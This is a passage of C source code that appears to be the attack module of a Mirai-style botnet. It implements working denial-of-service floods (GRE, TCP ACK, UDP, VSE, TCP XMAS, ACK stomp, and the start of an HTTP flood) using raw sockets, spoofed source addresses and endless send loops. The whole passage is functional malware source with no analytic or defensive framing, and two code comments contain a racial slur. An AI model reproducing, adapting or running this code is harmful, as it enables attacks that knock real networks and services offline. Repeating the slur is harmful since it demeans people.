            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;
        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;
        rand_str(payload, data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if (data_len > 1460)
        data_len = 1460;
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
			//Nigga
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
			//Nigga
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}
void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len;
    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);
        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_tcpxmas(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_xmas_data *xmas_data = calloc(targs_len, sizeof (struct attack_xmas_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, TRUE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, TRUE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, TRUE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;
        xmas_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
            continue;
        }
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);
        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;
                        xmas_data[i].addr = addr.sin_addr.s_addr;
                        xmas_data[i].seq = ntohl(tcph->seq);
                        xmas_data[i].ack_seq = ntohl(tcph->ack_seq);
                        xmas_data[i].sport = tcph->dest;
                        xmas_data[i].dport = addr.sin_port;
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);
                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = xmas_data[i].addr;
                        tcph->source = xmas_data[i].sport;
                        tcph->dest = xmas_data[i].dport;
                        tcph->seq = xmas_data[i].ack_seq;
                        tcph->ack_seq = xmas_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;
                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto xmas_setup_nums;
                    }
                }
            }
            if (time(NULL) - start_recv > 10)
            {
                close(fd);
                goto xmas_setup_nums;
            }
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->seq = htons(xmas_data[i].seq++);
            tcph->ack_seq = htons(xmas_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
        #ifdef DEBUG
            printf("stompisa\n");
        #endif
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    uint16_t data_minlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 1);
    uint16_t data_maxlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);


    if (data_minlen == 1 && data_maxlen == 1)
    {
        #ifdef DEBUG
            printf("min and max len not set, using len (len=%d)\n", data_len);
        #endif
    } else {
        data_len = data_minlen + rand_next() % (data_maxlen - data_minlen);
        // data_len = rand() % data_maxlen + data_minlen;;
        #ifdef DEBUG
            printf("using random len %d\n", data_len);
        #endif
    }

    // Set up receive socket
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        return;
    }

    // Retrieve all ACK/SEQ numbers
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

        stomp_setup_nums:

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        // Set it in nonblocking mode
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
 
        // Set up address to connect to
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);

        // Actually connect, nonblocking
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);

        // Get info
        while (TRUE)
        {
            int ret;

            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));

                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif

                        // Set up the packet
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;

                        rand_str(payload, data_len);
                        // #ifdef DEBUG
                        //     printf("data: %s\n", payload);
                        // #endif
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }

    // Start spewing out traffic
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("error = %d\n", errno);
#endif
    }
}
void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 512);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char generic_memes[10241] = {0};

    if (domain == NULL || path == NULL)
        return;

    if (util_strlen(path) > HTTP_PATH_MAX - 1)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (util_strlen(method) > 9)
        return;

    for (ii = 0; ii < util_strlen(method); ii++)
        if (method[ii] >= 'a' && method[ii] <= 'z')
            method[ii] -= 32;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    table_unlock_val(TABLE_ATK_SET_COOKIE);
    table_unlock_val(TABLE_ATK_REFRESH_HDR);
    table_unlock_val(TABLE_ATK_LOCATION_HDR);
    table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);
    table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);
    table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
    table_unlock_val(TABLE_ATK_CHUNKED);
    table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);
    table_unlock_val(TABLE_ATK_CONNECTION_HDR);
    table_unlock_val(TABLE_ATK_DOSARREST);
    table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);

    http_table = calloc(sockets, sizeof(struct attack_http_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].path, path);

        if (http_table[i].path[0] != '/')
        {
            memmove(http_table[i].path + 1, http_table[i].path, util_strlen(http_table[i].path));
            http_table[i].path[0] = '/';
        }

        util_strcpy(http_table[i].orig_method, method);
        util_strcpy(http_table[i].method, method);

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 20)
        {
            case 0:
